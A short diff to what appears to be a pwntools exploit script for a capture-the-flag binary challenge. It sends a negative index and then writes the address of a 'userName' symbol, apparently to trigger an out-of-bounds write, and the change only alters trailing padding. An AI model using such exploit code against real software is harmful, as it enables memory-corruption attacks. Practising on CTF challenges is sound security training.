@@ -33,7 +33,7 @@ if __name__ == "__main__":
     io.sendlineafter("Choose ", "2")
     io.sendlineafter(": ", "-4")
     #  DEBUG()
-    io.sendafter(': ', p32(elf.sym['userName']) + '00')
+    io.sendafter(': ', p32(elf.sym['userName']) + '0')
 
     io.interactive()
     io.close()
